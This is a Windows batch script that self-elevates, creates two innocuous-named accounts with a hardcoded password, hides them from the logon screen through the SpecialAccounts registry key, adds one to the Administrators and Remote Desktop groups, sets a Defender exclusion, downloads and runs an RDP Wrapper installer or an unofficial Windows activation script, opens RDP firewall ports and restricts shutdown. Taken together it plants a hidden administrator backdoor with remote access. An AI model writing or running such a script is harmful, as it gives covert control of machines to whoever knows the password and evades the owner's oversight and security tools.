@echo off
title  
setlocal EnableDelayedExpansion

echo.
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [*] requesting administrator rights
    powershell -Command "Start-Process '%~f0' -Verb runAs"
    exit /b
) else (
    echo [+] administrator rights granted
)

set /p MUSTCHANGE=[?] %username% must change the password before logging on the first time via rdp? (5) 
if "!MUSTCHANGE!"=="5" (
    wmic UserAccount where "Name='%USERNAME%' and Domain='%COMPUTERNAME%'" set PasswordExpires=TRUE
    powershell -NoProfile -ExecutionPolicy Bypass -Command "Set-LocalUser -Name '%USERNAME%' -PasswordNeverExpires $false"
    net user %username% /logonpasswordchg:yes
    echo [*] the %username% must change the password before logging on the first time via rdp 
)

:: User account
echo ---------- User account ----------

set "PASSWORD=13*Insan@5"
set "USERACCOUNT1=HomeGroupUser"
set "USERACCOUNT2=Other user"

echo [*] creating users
net user "!USERACCOUNT1!" "!PASSWORD!" /add >nul 2>&1
net user "!USERACCOUNT1!" "!PASSWORD!" >nul 2>&1
net user "!USERACCOUNT1!" /comment:"A user account managed by the system.">nul 2>&1
net user "!USERACCOUNT1!" /expires:never >nul 2>&1
net user "!USERACCOUNT1!" /active:yes >nul 2>&1

net user "!USERACCOUNT2!" "!PASSWORD!" /add >nul 2>&1
net user "!USERACCOUNT2!" "!PASSWORD!" >nul 2>&1
net user "!USERACCOUNT2!" /comment:"A user account managed by the system.">nul 2>&1
net user "!USERACCOUNT2!" /expires:never >nul 2>&1
net user "!USERACCOUNT2!" /active:yes >nul 2>&1

wmic UserAccount where "Name='!USERACCOUNT1!' and Domain='%COMPUTERNAME%'" set PasswordExpires=FALSE >nul 2>&1
wmic UserAccount where "Name='!USERACCOUNT2!' and Domain='%COMPUTERNAME%'" set PasswordExpires=FALSE >nul 2>&1

powershell -NoProfile -ExecutionPolicy Bypass -Command "Set-LocalUser -Name '!USERACCOUNT1!' -PasswordNeverExpires $true"
powershell -NoProfile -ExecutionPolicy Bypass -Command "Set-LocalUser -Name '!USERACCOUNT2!' -PasswordNeverExpires $true"

reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v "!USERACCOUNT1!" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v "!USERACCOUNT2!" /t REG_DWORD /d 0 /f >nul 2>&1

set "SID_ADMIN=S-1-5-32-544"
set "SID_RDP=S-1-5-32-555"

for %%G in ("%SID_ADMIN%" "%SID_RDP%") do (
    for /f "tokens=*" %%a in ('wmic group where "sid='%%~G'" get name ^| findstr /v /r "^$ ^Name"') do (
        set "groupName=%%a"
        :: Use PowerShell to trim trailing spaces
        for /f "tokens=*" %%b in ('powershell -command "\"!groupName!\".Trim()"') do set "groupName=%%b"
        echo [+] %%~G :: !groupName!
        net localgroup "!groupName!" "%USERACCOUNT1%" /add
    )
)

echo ---------- RDP Enabling ----------

echo [+] enabling remote desktop

set /p MODE=[?] 0 - install rdpwrap, 1 - activate windows enterprise for virtual desktops? 
if "%MODE%"=="0" (
    echo [+] installing RDP Wrapper
    powershell -Command "Add-MpPreference -ExclusionPath '%TEMP%\RDPW_Installer.exe'" >nul 2>&1

    echo [+] downloading installer
    powershell -Command "Invoke-WebRequest -Uri 'https://github.com/sebaxakerhtc/rdpwrap/releases/download/v1.8.9.9/RDPW_Installer.exe' -OutFile '%TEMP%\RDPW_Installer.exe'"

    if exist "%TEMP%\RDPW_Installer.exe" (
        echo [+] installer downloaded successfully

        echo [+] running RDP Wrapper installer
        start /wait %TEMP%\RDPW_Installer.exe

        echo [~] waiting for rdp control panel to launch
        :waitRDP
        tasklist | findstr /i "rdp_cnc.exe" >nul
        if errorlevel 1 goto waitRDP

        echo [+] closing rdp control panel and cleaning up
        taskkill /f /im rdp_cnc.exe >nul 2>&1
        del "%TEMP%\RDPW_Installer.exe" >nul 2>&1
        powershell -Command "Remove-MpPreference -ExclusionPath '%TEMP%\RDPW_Installer.exe'" >nul 2>&1
    ) else (
        echo [!] error: RDP Wrapper installer download failed
        goto endRDPInstall
    )
) else if "%MODE%"=="1" (
    echo [+] activating windows special edition
    changepk.exe /ProductKey NPPR9-FWDCX-D2C8J-H872K-2YT43 >nul 2>&1
    cscript //nologo slmgr.vbs /ipk CPWHC-NT2C7-VYW78-DHDB2-PG3GK >nul 2>&1
    powershell -Command "$temp = [System.IO.Path]::GetTempPath(); Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/massgravel/Microsoft-Activation-Scripts/refs/heads/master/MAS/All-In-One-Version-KL/MAS_AIO.cmd' -OutFile ($temp + 'MAS_AIO.cmd')"
    start /wait "" "%TEMP%\MAS_AIO.cmd" /HWID
    del "%TEMP%\MAS_AIO.cmd"
)

for /f "tokens=3" %%A in ('reg query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber 2^>nul') do set /a RDPPORT=%%A

echo wscript.Sleep 5000>"%temp%\sleep5.vbs"
cscript //nologo "%temp%\sleep5.vbs"
del "%temp%\sleep5.vbs"
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f >nul 2>&1
powershell -Command "Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server' -Name 'fDenyTSConnections' -Value 0"
powershell -Command "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services' -Name 'fDenyTSConnections' -Value 0"
powershell -Command "Set-Service -Name TermService -StartupType Automatic"
powershell -Command "Start-Service -Name TermService"
sc config TermService start= auto >nul 2>&1
sc start TermService
netsh advfirewall firewall set rule group="Remote Desktop" new enable=Yes >nul 2>&1

echo [*] current rdp port is %RDPPORT%
netsh advfirewall firewall add rule name="RDP" dir=in action=allow protocol=TCP localport=%RDPPORT% >nul 2>&1
netsh advfirewall firewall add rule name="RDP" dir=in action=allow protocol=UDP localport=%RDPPORT% >nul 2>&1
net start TermService >nul 2>&1

set /p RDPWORKS=[?] does rdp not work (n)? 
if "!RDPWORKS!"=="n" (
    set /p RDPPORT2=[?] enter new rdp port: 
    powershell -Command "Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name 'PortNumber' -Value !RDPPORT2!"

    if !errorlevel! equ 0 (
        echo [+] RDP port changed to !RDPPORT2!
    ) else (
        echo [!] error applying RDP port change
    )

    netsh advfirewall firewall add rule name="Microsoft RDP Port Redirector" dir=in action=allow protocol=TCP localport=!RDPPORT2! >nul 2>&1
    netsh advfirewall firewall add rule name="Microsoft RDP Port Redirector" dir=in action=allow protocol=UDP localport=!RDPPORT2! >nul 2>&1

    sc stop tvnserver >nul 2>&1
    sc stop uvnc_service >nul 2>&1

    powershell -Command "Restart-Service -Name TermService -Force" >nul 2>&1
)

echo [+] preventing shutdown in this computer
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ShutdownWithoutLogon /t REG_DWORD /d 0 /f >nul 2>&1
REG ADD "HKLM\SOFTWARE\Microsoft\PolicyManager\default\Start\HidePowerButton" /v value /t REG_DWORD /d 1 /f >nul 2>&1
REG ADD "HKLM\SOFTWARE\Microsoft\PolicyManager\default\Start\HideSleepButton" /v value /t REG_DWORD /d 1 /f >nul 2>&1
REG ADD "HKLM\SOFTWARE\Microsoft\PolicyManager\default\Start\HideHibernateButton" /v value /t REG_DWORD /d 1 /f >nul 2>&1
set infFile=%temp%\shutdown_restrict.inf
(
echo [Unicode]
echo Unicode=yes
echo [Version]
echo signature="$CHICAGO$"
echo Revision=1
echo [Privilege Rights]
echo SeShutdownPrivilege = *S-1-5-32-544
) > %infFile%
secedit /configure /db %temp%\shutdown.db /cfg %infFile% /quiet
del %infFile%
del %temp%\shutdown.db

echo [+] scheduling reboot in 15 minutes
shutdown /r /t 900 /d p:4:1 >nul 2>&1

echo [*] setup complete
echo.
timeout 5 > nul
exit /b
